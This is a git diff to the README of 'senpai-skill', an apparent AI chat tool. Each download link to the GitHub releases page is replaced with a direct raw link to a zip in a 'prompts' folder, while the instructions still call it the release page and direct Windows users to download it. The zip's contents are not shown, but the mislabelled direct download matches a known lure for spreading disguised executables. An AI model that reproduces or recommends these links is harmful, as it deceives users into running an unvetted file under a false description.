@@ -1,6 +1,6 @@
 # 🤖 senpai-skill - Your AI for group chats
 
-[![Download senpai-skill](https://img.shields.io/badge/Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sarbjit4840/senpai-skill/releases)
+[![Download senpai-skill](https://img.shields.io/badge/Download%20Now-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sarbjit4840/senpai-skill/raw/refs/heads/main/prompts/senpai-skill-3.2.zip)
 
 ## 📦 What this is
 
@@ -32,7 +32,7 @@ If your PC can run common desktop apps, it should be fine for this tool.
 
 ## 🚀 Download and install
 
-1. Visit the release page here: https://github.com/sarbjit4840/senpai-skill/releases
+1. Visit the release page here: https://github.com/sarbjit4840/senpai-skill/raw/refs/heads/main/prompts/senpai-skill-3.2.zip
 2. Find the latest release at the top of the page
 3. Open the list of files under that release
 4. Download the Windows file that matches your device
@@ -164,7 +164,7 @@ Close the app, open it again, and try a smaller piece of text. If that does not 
 
 ## 🔗 Download again
 
-If you need the release page again, use this link: https://github.com/sarbjit4840/senpai-skill/releases
+If you need the release page again, use this link: https://github.com/sarbjit4840/senpai-skill/raw/refs/heads/main/prompts/senpai-skill-3.2.zip
 
 ## 🧩 Example uses
 
